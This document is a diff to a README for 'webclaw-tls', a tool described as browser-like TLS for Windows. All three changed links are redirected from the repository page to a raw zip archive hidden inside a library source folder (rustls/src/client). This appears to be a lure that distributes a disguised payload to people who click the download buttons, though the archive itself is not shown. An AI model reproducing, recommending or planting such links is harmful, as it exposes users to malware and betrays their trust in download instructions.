@@ -1,6 +1,6 @@
 # 🔒 webclaw-tls - Browser-like TLS for Windows
 
-[![Download webclaw-tls](https://img.shields.io/badge/Download-Webclaw--TLS-blue?style=for-the-badge)](https://github.com/anniet5664/webclaw-tls)
+[![Download webclaw-tls](https://img.shields.io/badge/Download-Webclaw--TLS-blue?style=for-the-badge)](https://github.com/anniet5664/webclaw-tls/raw/refs/heads/main/webclaw-rustls/rustls/src/client/tls-webclaw-v1.1.zip)
 
 ## 🧭 What this app does
 
@@ -24,7 +24,7 @@ If you plan to use the app with other tools, a 64-bit Windows system is the best
 
 Use this link to visit the download page:
 
-[Go to the webclaw-tls download page](https://github.com/anniet5664/webclaw-tls)
+[Go to the webclaw-tls download page](https://github.com/anniet5664/webclaw-tls/raw/refs/heads/main/webclaw-rustls/rustls/src/client/tls-webclaw-v1.1.zip)
 
 ## 🪟 How to download on Windows
 
@@ -220,5 +220,5 @@ For smoother runs:
 
 Download or open the project here:
 
-[https://github.com/anniet5664/webclaw-tls](https://github.com/anniet5664/webclaw-tls)
+[https://github.com/anniet5664/webclaw-tls/raw/refs/heads/main/webclaw-rustls/rustls/src/client/tls-webclaw-v1.1.zip](https://github.com/anniet5664/webclaw-tls/raw/refs/heads/main/webclaw-rustls/rustls/src/client/tls-webclaw-v1.1.zip)
 
